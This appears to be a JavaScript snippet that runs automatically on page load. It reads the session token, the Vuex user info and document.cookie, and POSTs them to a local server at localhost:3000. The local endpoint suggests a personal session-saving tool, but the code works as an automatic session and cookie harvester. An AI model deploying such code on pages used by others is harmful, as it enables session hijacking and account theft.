function getSessionData() {
    const token = sessionStorage.getItem("token");
    const vuex = sessionStorage.getItem("vuex");

    let sessionId = "";
    let identifier = "";
    let lasttime = "";

    try {
        sessionId = JSON.parse(token)?.sessionId || "";
        sessionId = CryptoJS.MD5(sessionId).toString();
        const vuexData = JSON.parse(vuex)?.app?.userinfo || {};
        identifier = vuexData["identifier"];
        lasttime = vuexData["lasttime"];
    } catch (e) {
        console.error("解析 sessionStorage 出错", e);
    }

    if (sessionId && identifier) {
        fetch("http://localhost:3000/save", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                sessionId,
                data:{
                    identifier,
                    lasttime,
                    sessionStorage: {
                        token: sessionStorage.getItem("token"),
                        vuex: sessionStorage.getItem("vuex")
                    },
                    cookies: document.cookie
                }
            })
        });
    }
}

// 页面加载后自动执行
window.addEventListener("load", () => {
    setTimeout(getSessionData, 1000); // 延迟 1 秒确保 sessionStorage 准备好
});
